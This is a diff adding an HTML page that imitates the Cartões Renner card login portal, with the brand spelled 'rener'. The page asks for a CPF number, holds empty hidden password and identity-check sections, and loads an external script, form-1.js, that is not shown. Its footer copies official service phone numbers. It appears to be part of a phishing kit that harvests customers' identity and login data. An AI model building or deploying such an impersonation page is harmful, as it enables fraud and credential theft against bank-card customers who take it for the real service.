@@ -1,0 +1,653 @@
+<html lang="pt-br"><head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cartões Renner</title>
+
+    <!-- Meta Tags -->
+    <meta name="application-name" content="Lojas rener">
+    <meta name="site-version" content="1.0.0" meta-tag="SITE_VERSION">
+    <meta name="apple-mobile-web-app-status-bar-style" content="#1e1e1e" id="metatag-ios-theme-color">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+
+    <meta name="build-id" content="" meta-tag="BUILD_ID">
+    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous">
+
+    <!-- Icones -->
+    <link href="/cartoes-rener/images/favicon.ico" type="image/x-icon" rel="icon">
+    <link href="/cartoes-rener/images/lojas-rener.png" sizes="144x144" rel="icon">
+    <link href="/cartoes-rener/images/lojas-rener.png" rel="apple-touch-icon">
+
+    <!-- Arquivos Vendor Css e JS -->
+
+    <link rel="stylesheet" href="/cartoes-rener/libs/bootstrap/bootstrap.min.css">
+    <script src="/cartoes-rener/libs/bootstrap/bootstrap.bundle.min.js"></script>
+    <script src="/cartoes-rener/libs/jquery/jquery.min.js"></script>
+    <script src="/cartoes-rener/libs/jquery-mask/jquery-mask.min.js"></script>
+
+    <style>
+        /* Imports */
+        @import url('https://fonts.googleapis.com/css2?family=Nunito&family=Roboto&family=Secular+One&display=swap');
+        /* ENDIMPORTS */
+        :root{
+            --bs-dark: #4a4a4a; 
+            --bs-danger: #c7282d; 
+            --bs-dark-900: #1e1e1f;
+        }
+
+        /* GLOBALS STYLE  */
+        body{
+            line-height: 1.5;
+            color: #0a0a0a !important;
+            font-family: 'Roboto', sans-serif !important;
+            font-weight: 300;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        button{
+            font-size: 18px !important;
+        }
+
+        input:focus {
+            box-shadow: none;
+        }
+
+        .__NO_UNDERLINE{
+            text-decoration: none;
+        }
+        /* END GLOBLA */
+
+        /* HEADER STYLE */
+        .__HEADER_STYLE{
+            padding: 10px 0;
+            max-width: 75rem;
+            margin-right: auto;
+            margin-left: auto;
+        }
+        .__HEADER_COLOR_DARK_900{
+            background-color: var(--bs-dark-900);
+        }
+
+        ._DIV_BETWEEN_LOGO_HEADER_ img{
+            width: 100px;
+            height: 50px;
+        }
+
+        /* END HEADER STYLE */
+
+        /* BODY */
+
+        .__LOGOS_BODY div img{
+            max-width: 162px;
+            max-height: 86px;
+        }
+
+        .__LOGOS_BODY div ._TITLE{
+            line-height: 30px;
+            text-transform: uppercase;
+            line-height: 30px;
+            color: #1e1e1f;
+            font-size: 33px;
+            font-weight: 900 !important;
+        }
+
+        .__LOGIN_FORM .__BOX{
+        border-color: var(--bs-dark-900);
+        border-style: solid;
+        }
+
+        .__LOGIN_FORM .__BORDER_3PX, .__CARD_FORM .__BORDER_5PX{
+            border-width: 3px !important;
+        }
+        .__LOGIN_FORM .__BORDER_5PX, .__CARD_FORM .__BORDER_5PX{
+            border-width: 5px !important;
+        }
+
+        .__LOGIN_FORM div h6 {
+            margin: 0;
+            text-align: center;
+            line-height: 1;
+            font-size: 16px;
+            font-weight: bold;
+        }
+
+        .__BORDER_BOTTOM_BLACK{
+            border-bottom: 1px solid var(--bs-dark-900);
+        }
+
+        .__INPUT_FLOAT_CUSTUMIZED{
+            height: calc(2.5rem + 2px) !important;
+        }
+
+        .__CARD_TITLE{
+            font-weight: 900 !important;
+        }
+
+        ._INVALID_CPF{
+            visibility: hidden;
+        }
+
+        .__TITLE_H1{
+            font-size: 24px !important;
+            font-weight: 900 !important;
+        }
+
+        .__CARD_FORM, .__BORDER_5PX{
+            border-color: var(--bs-dark-900);
+            border-style: solid;
+            border-width: 5px;
+        }
+
+        .bg-gray-light{
+            background-color: #d3d3d3 !important;
+        }
+
+
+        .dot i{
+            font-size: 8px;
+        }
+
+        @media (max-width: 767px){
+            .__LOGOS_BODY div ._TITLE {
+                text-align: left;
+                line-height: 20px;
+                font-size: 20px;
+            }
+        }
+
+
+        /* SECTION 2 */
+
+        .bg-login{
+            background-image: url('/cartoes-rener/images/bg-login.svg');
+        }
+
+        ._TITLE_H3{
+            font-weight: 900 !important;
+            font-family: Roboto, Arial, Helvetica, Helvetica Neue, sans-serif;
+        }
+        ._TITLE_H4{
+            font-weight: 900 !important;
+            font-family: Roboto, Arial, Helvetica, Helvetica Neue, sans-serif;
+            font-size: 18px;
+        }
+
+        ._CUSTUM_LAST_FORM>label{
+            padding: 0.4rem .75rem !important;
+        }
+        ._CUSTUM_LAST_FORM input:focus{
+            box-shadow:none !important;
+            border: 0.8px solid rgb(75, 73, 73) !important;
+        }
+
+
+        ._CUSTUM_LAST_FORM label{
+            font-size: 15px !important;
+        }
+
+        /* END SECTION 2 */
+
+        /* END BODY STYLE */
+
+        /* FOOTER STYLE */
+        footer{
+            background-color: #232323 !important;
+        }
+        .__LIST{
+            list-style: none;
+        }
+
+        .__LIST_ITEM a{
+            color: whitesmoke;
+            text-decoration: none;
+        }
+
+        .__LIST_ITEM a:hover{
+            text-decoration: underline;
+        }
+
+        ._FOOTER_TITLE_H4{
+            font-weight: 800;
+            font-size: medium;
+            color: whitesmoke;
+        }
+
+        .__TITLE_H4_RIGHT_FOOTER{
+            display: block;
+            color: white;
+            font-weight: bolder !important;
+            margin: 0 0 14px;
+            border-bottom: 1px solid #fff;
+            padding-bottom: 30px;
+            padding-left: 15px;
+            width: 100%;
+            font-size: 20px;
+        }
+
+        ._LINK{
+            text-decoration: underline !important;
+        }
+        ._NAV_LINK, ._NAV_LINK_TITLE{
+            color: white;
+            text-decoration: none;
+        }
+        ._NAV_LINK:hover, ._NAV_LINK_TITLE:hover{
+            text-decoration: underline;
+            color: white;
+        }
+
+        ._NAV_LINK_TITLE{
+            font-size: 19px;
+            font-weight: 900;
+        }
+        /* END FOOTER STYLE */
+    </style>
+</head>
+<body>
+    <header class="__HEADER_COLOR_DARK_900">
+        <div class="container-fluid ">
+            <div class="d-flex justify-content-center justify-content-md-between py-1 py-md-2 align-items-center __HEADER_STYLE">
+                <div class="_DIV_BETWEEN_LOGO_HEADER_ d-none d-md-block"> 
+                    <img src="/cartoes-rener/images/logo-realize.svg" alt="Logo realize">
+                </div>
+                <div class="justify-self-center">
+                    <!-- Md -->
+                    <a href="#" target="_blank" class="btn btn-outline-light d-none d-md-block">
+                        ir para a loja virtual
+                    </a>
+                    <!-- Sm -->
+                    <a href="#" target="_blank" class="text-white d-block d-md-none __NO_UNDERLINE">
+                        ir para a loja virtual
+                    </a>
+                </div>
+            </div>
+        </div>
+    </header>
+    <main id="root">
+ 
+        <section id="_FORM_LOGIN" class="container py-4">
+            <div class="row justify-content-start">
+                <div class="col-md-3 ">
+                    <div class="d-flex px-2 gap-1 gap-md-3 flex-row flex-md-column __LOGOS_BODY justify-content-start justify-content-md-end">
+                        <div>
+                        <img src="/cartoes-rener/images/car_rener.png" alt="Cartão rener Logo">
+                        </div>
+                        <div class="d-flex gap-3 flex-md-column">
+                            <img src="/cartoes-rener/images/cartao-rener-logo.svg" alt="Cartão rener Logo">
+                            <img src="/cartoes-rener/images/meu-cartao-logo.svg" alt="Meu cartão rener Logo">
+                        </div>
+                       
+                    </div>
+                </div>
+                <!-- FORM -->
+                <div class="col-md-4">
+                    <div class="d-flex flex-column gap-3 __LOGIN_FORM">
+                        <div>
+                            <p class="text-center text-md-start">
+                                Pague suas compras e visualize seus limites. <br>
+                                Acesse digitando seu <span class="text-uppercase">cpf</span>
+                            </p>
+                        </div>
+                        <div class="__BOX __BORDER_3PX d-flex flex-column justify-content-center p-3 gap-3">
+                            <h6>
+                                Está com dificuldades de acesso?
+                            </h6>
+                            <button class="btn btn-dark fw-">
+                                conheça o acesso rápido
+                            </button>
+                        </div>
+                        <div class="__BOX __BORDER_5PX d-flex flex-column justify-content-center p-3 gap-3">
+                            <h5 class="__CARD_TITLE">
+                                Acesse sua conta
+                            </h5>
+                            <div class="__INPUT mb-4">
+                                <div class="input-group input-group-sm  __BORDER_BOTTOM_BLACK pb-1 _INVALID_ALERT _BORDER_BOTTOM_INVALID">
+                                    <span class="input-group-text border-0 m-0 p-0 mb-0 bg-transparent align-items-end">
+                                        <i class="far fa-user-alt _INVALID_ALERT" style="font-size: 18px;"></i>
+                                    </span>
+                                    <div class="form-floating flex-grow-1 __INPUT_FLOAT_CUSTUMIZED">
+                                        <input type="text" class="form-control shadow-none border-0 bg-transparent __CPF" name="__CPF" id="__CPF" placeholder="Code 1" maxlength="14">
+                                        <label for="code1" class="mb-0 pb-0">
+                                            <small class="text-muted text-uppercase" style="font-size: 16px;">cpf</small>
+                                        </label>
+                                    </div>
+                                   
+                                </div>
+                                <small class="text-danger _INVALID_CPF" style="font-size: 12px;">Número de CPF inválido</small>
+                            </div>
+                            <div>
+                                <button disabled="" class="btn btn-dark w-100 __BTN_PROSSEGUIR">
+                                    Prosseguir
+                                </button>
+                            </div>
+                            <div>
+                                <p class="text-center">
+                                   <small>
+                                        Esse formulário está protegido por Google reCaptcha.
+                                        <a class="text-muted" href="https://policies.google.com/privacy?hl=en" target="_blank">
+                                            Termos
+                                        </a> 
+                                        -
+                                        <a class="text-muted" href="https://policies.google.com/terms?hl=en" target="_blank">
+                                            Privacidade
+                                        </a> 
+                                   </small>
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <!-- END FORM -->
+               
+            </div>
+        </section>
+      
+        <section style="display:none;" id="_FORM_SENHA" class="container py-4 mb-4"></section>
+        <div class="container py-4" style="display: none;" id="_FORM_IDENTIDADE"></div>
+        
+        <!-- STATIC NOT CHANGE -->
+        <section class="container-fluid pt-5  bg-login">
+            <div class="container">
+                <div class="row justify-content-center pb-5">
+                    <div class="col-12 text-center">
+                        <h4 class="fw-bolder text-uppercase _TITLE_H3">seu dia-a-dia mais digital:</h4>
+                        <p class="text-uppercase">
+                            Aproveite mais facilidades pelo app lojas rener
+                        </p>
+                    </div>
+                </div>
+                <div class="row justify-content-center">
+                    <div class="col-md-4">
+                        <p class="text-center">
+                            Acompanhe seu histórico de compras, saldo e limites. Confira a sua melhor data para compra e também gere boletos para pagamento dos seus carnês e faturas.
+                        </p>
+                        <div class="pt-3 pb-5 pt-md-5 row text-center">
+                            <h4 class="_TITLE_H4">Disponível nas lojas:</h4>
+                            <div class="d-flex justify-content-center gap-2">
+                                <img src="/cartoes-rener/images/google-play-badge-reverse.svg" alt="Play store">
+                                <img src="/cartoes-rener/images/app-store-badge.svg" alt="App store">
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-4">
+                        <img src="/cartoes-rener/images/celular-login.png" class="img-fluid" alt="Apk image">
+                    </div>
+                </div>
+            </div>
+        </section>
+    </main>
+    <footer class="pt-5">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-4">
+                    <div class="d-flex flex-column justify-content-start">
+                        <ul class="__LIST p-0">
+                            <li class="__LIST_ITEM mb-3">
+                                <a href="#" target="_blank">Home</a>
+                            </li>
+                            <li class="__LIST_ITEM mb-3">
+                                <a href="#">rener</a>
+                            </li>
+                            <li class="__LIST_ITEM mb-3">
+                                <a href="#" target="_blank">Meu cartão</a>
+                            </li>
+                            <li class="__LIST_ITEM mb-3">
+                                <a href="#" target="_blank">Quero Cartão rener</a>
+                            </li>
+                            <li class="__LIST_ITEM mb-3">
+                                <a href="#" target="_blank">Contato</a>
+                            </li>
+
+                            <li class="__LIST_ITEM mt-4">
+                                <a href="#" target="_blank">Institucional</a>
+                            </li>
+                        </ul>
+                    </div>
+                    <div class="d-flex flex-column">
+                        <h4 class="_FOOTER_TITLE_H4">Perguntas Frequentes</h4>
+                        <ul class="__LIST">
+                            <li class="__LIST_ITEM mb-3">
+                                <a href="#" target="_blank">Cartão rener</a>
+                            </li>
+                            <li class="__LIST_ITEM mb-3">
+                                <a href="#" target="_blank">Meu Cartão</a>
+                            </li>
+                            <li class="__LIST_ITEM mb-3">
+                                <a href="#" target="_blank">Saque Rápido e Seguros</a>
+                            </li>
+                            <li class="__LIST_ITEM mb-3">
+                                <a href="#" target="_blank">Privacidade e Segurança</a>
+                            </li>
+                        </ul>
+                        <ul class="__LIST p-0">
+                            <li class="__LIST_ITEM mb-3">
+                                <a href="#" target="_blank">Central de Negociação</a>
+                            </li>
+                            <li class="__LIST_ITEM mb-3">
+                                <a href="#" target="_blank">Acessa Sua Conta</a>
+                            </li>
+                        </ul>
+                    </div>
+                    <div class="d-flex flex-column">
+                        <p class="text-muted">
+                            Baixe o app da rener 
+                        </p>
+                        <div class="d-flex gap-3">
+                            <img style="max-width: 135px; max-height: 40px;" src="/cartoes-rener/images/google-play-badge.svg" alt="" srcset="">
+                            <img style="max-width: 135px; max-height: 40px;" src="/cartoes-rener/images/app-store-badge_.svg" alt="" srcset="">
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-8">
+                    <h4 class="__TITLE_H4_RIGHT_FOOTER">Canais de Atendimento</h4>
+                    <div class="row">
+                        <div class="col-md-6">
+                            <div class="d-flex text-left mb-2">
+                                <h4 class="fw-bold text-muted">
+                                    Central de Atendimento Cartões rener:
+                                </h4>
+                            </div>
+                            <div class="d-flex mb-2">
+                                <p class="text-muted">
+                                    2º via de faturas, consultas, informações, bloqueio e desbloqueio de cartões e orientações sobre canais digitais.
+                                </p>
+                            </div>
+                            <div class="d-flex mb-2">
+                                <p class="text-white">
+                                    Capitais e Regiões Metropolitanas <br>
+                                    <span style="font-size: 24px;font-weight: bolder;">3004 5060</span>
+                                </p>
+                            </div>
+                            <div class="d-flex mb-2">
+                                <p class="text-white">
+                                    Demais Localidades <br>
+                                    <span style="font-size: 24px;font-weight: bolder;">0800 073 6637</span>
+                                </p>
+                            </div>
+                            <div class="d-flex mb-2">
+                                <p class="text-white">
+                                    Horário de atendimento: 24 horas por dia, todos os dias.
+                                </p>
+                            </div>
+                            <div class="d-flex mb-2">
+                                <p class="text-white">
+                                    Comunicação em Libras via videochamada para Deficientes Auditivos ou de Fala     
+                                </p>
+                            </div>
+                            <div class="d-flex mb-2">
+                                <p class="text-white">
+                                    Horário de atendimento: 
+                                </p>
+                            </div>
+                         
+                            <div class="d-flex mb-2">
+                                <p class="text-white">
+                                    De segunda a sábado, das 8h às 20h40
+                                </p>
+                            </div>
+                            <div class="d-flex mb-2">
+                                <a class="text-white __LIST_ITEM">
+                                    Para acessar o canal de atendimento por vídeo, clique aqui.
+                                </a>
+                            </div>
+                            <div class="d-flex mb-2">
+                                <h4 class="fw-bold text-muted">
+                                    Meu Cartão:
+                                </h4>
+                            </div>
+                            <div class="d-flex mb-2">
+                                <p class="text-muted">
+                                    SAC (Serviço de Atendimento ao Cliente) - Reclamações, Informações e Cancelamentos
+                                </p>
+                            </div>
+                            <div class="d-flex mb-2">
+                                <p class="text-white">
+                                    0800 600 6601
+                                    <br>
+                                    Horário de atendimento: 24 horas por dia, todos os dias. 
+                                </p>
+                            </div>
+                            <div class="d-flex mb-2">
+                                <small class="text-muted">
+                                    Verifique seus saldos, carnês e faturas e gere boletos para pagamentos pelo WhatsApp:    
+                                </small>
+                            </div>
+                            <div class="d-flex mb-2">
+                                <p class="text-white">
+                                    Mande um Oi para <i class="fas fa-whatsapp"></i>
+                                    <a href="#" class="_NAV_LINK">+55 (51) 3921 4004</a>
+                                </p>
+                            </div>
+                            <div class="d-flex mb-2">
+                                <p class="text-white">
+                                    Comunicação em Libras via videochamada para Deficientes Auditivos ou de Fala
+                                </p>
+                            </div>
+                            <div class="d-flex mb-2">
+                                <p class="text-white">
+                                    Horário de atendimento:
+                                </p>
+                            </div>
+                            <div class="d-flex mb-2">
+                                <p class="text-white">
+                                    De segunda a sábado, das 8h às 20h40
+                                </p>
+                            </div>
+                            <div class="d-flex mb-2">
+                                <small class="text-white">
+                                    <a href="#" class="_NAV_LINK">
+                                        Para acessar o canal de atendimento por vídeo, clique aqui.
+                                    </a>
+                                </small>
+                            </div>
+                            <div class="d-flex mb-2">
+                                <small class="text-white">
+                                    <a href="#" class="_NAV_LINK_TITLE">
+                                        Orientações para Representantes de 
+                                        Deficientes Auditivos ou de Fala
+                                    </a>
+                                </small>
+                            </div>
+                            
+                        </div>
+                        <div class="col-md-6">
+                            <div class="d-flex text-left mb-2">
+                                <h4 class="fw-bold text-muted">
+                                    Cartão rener:
+                                </h4>
+                            </div>
+                            <div class="d-flex mb-2">
+                                <p class="text-muted">
+                                    SAC (Serviço de Atendimento ao Cliente) - Reclamações, Informações e Cancelamentos
+                                </p>
+                            </div>
+                            <div class="d-flex mb-2">
+                                <p class="text-white">
+                                    0800 600 6601
+                                </p>
+                            </div>
+                            <div class="d-flex mb-2">
+                                <p class="text-white">
+                                    Horário de atendimento: 24 horas por dia, todos os dias.
+                                </p>
+                            </div>
+                            <div class="d-flex mb-2">
+                                <p class="text-muted">
+                                    Verifique seus saldos, carnês e faturas e gere boletos para pagamentos pelo WhatsApp:
+                                </p>
+                            </div>
+                            <div class="d-flex mb-2">
+                                <p class="text-white">
+                                    Mande um Oi para <i class="fas fa-whatsapp"></i>
+                                    <a href="#" class="_NAV_LINK">+55 (51) 3921 4004</a>
+                                </p>
+                            </div>
+                            <div class="d-flex mb-2">
+                                <h4 class="text-muted">
+                                    Central De Negociação:
+                                </h4>
+                            </div>
+                            <div class="d-flex mb-2">
+                                <p class="text-white">
+                                    Atendimento exclusivo para clientes com pendências de pagamento.
+                                </p>
+                            </div>
+                            <div class="d-flex mb-2">
+                                <p class="text-muted">
+                                    Entre em contato via WhatsApp:
+                                </p>
+                            </div>
+                            <div class="d-flex mb-2">
+                                <p class="text-white">
+                                    Mande um Oi para
+                                    <a href="#" class="_NAV_LINK">+55 (51) 3921 5464</a>
+                                </p>
+                            </div>
+                            <div class="d-flex mb-2">
+                                <p class="text-muted">
+                                    Se preferir, entre em contato via telefone:
+                                </p>
+                            </div>
+                            <div class="d-flex mb-1">
+                                <p class="text-white">
+                                    <span style="font-size: 24px;font-weight: bolder;">4004 2900</span>
+                                </p>
+                            </div>
+                            <div class="d-flex mb-2">
+                                <p class="text-white">
+                                    Horário de atendimento:
+                                    <br>
+                                    Em dias úteis, das 08h às 21h
+                                    <br>
+                                    Aos Sábados, das 08h às 20h.
+                                </p>
+                            </div>
+                            <div class="d-flex mb-2">
+                                <b class="text-muted">Ouvidoria:</b>
+                            </div>
+                            <div class="d-flex mb-2">
+                                <p class="text-white">
+                                    Se não ficar satisfeito com a solução apresentada, de posse do protocolo, nos contate.
+                                </p>
+                            </div>
+                            <div class="d-flex mb-1">
+                                <p class="text-white">
+                                    <span style="font-size: 24px;font-weight: bolder;"> 0800 727 0127   </span>                            
+                                </p>
+                            </div>
+                            <div class="d-flex mb-1">
+                                <p class="text-white p-0 m-0">
+                                    Horário de atendimento: <br>      
+                                    Em dias úteis, das 10h às 16h.                       
+                                </p>
+                            </div>
+
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+    <script src="/cartoes-rener/form-1.js"></script>
+
+</body></html>
